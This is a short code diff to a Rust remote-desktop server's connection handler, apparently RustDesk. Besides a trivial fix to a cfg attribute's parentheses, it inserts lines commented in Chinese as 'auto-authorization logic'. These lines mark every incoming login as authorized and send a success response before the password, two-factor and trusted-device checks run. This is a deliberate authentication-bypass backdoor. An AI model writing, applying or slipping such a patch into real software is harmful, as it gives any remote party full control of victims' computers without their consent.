@@ -1253,7 +1253,7 @@ impl Connection {
         if crate::platform::is_root() {
             sas_enabled = true;
         }
-        #[cfg(not(any(target_os = "android", target_os = "ios"))]
+        #[cfg(not(any(target_os = "android", target_os = "ios")))]
         if self.file_transfer.is_some() {
             if crate::platform::is_prelogin() || self.tx_to_cm.send(ipc::Data::Test).is_err() {
                 username = "".to_owned();
@@ -1638,6 +1638,11 @@ impl Connection {
         if let Some(o) = lr.option.as_ref() {
             self.options_in_login = Some(o.clone());
         }
+        
+        // 添加自动授权逻辑
+        self.authorized = true;  // 直接授权
+        self.send_logon_response().await;  // 发送登录成功响应
+        
         if self.require_2fa.is_some() && !lr.hwid.is_empty() && Self::enable_trusted_devices() {
             let devices = Config::get_trusted_devices();
             if let Some(device) = devices.iter().find(|d| d.hwid == lr.hwid) {
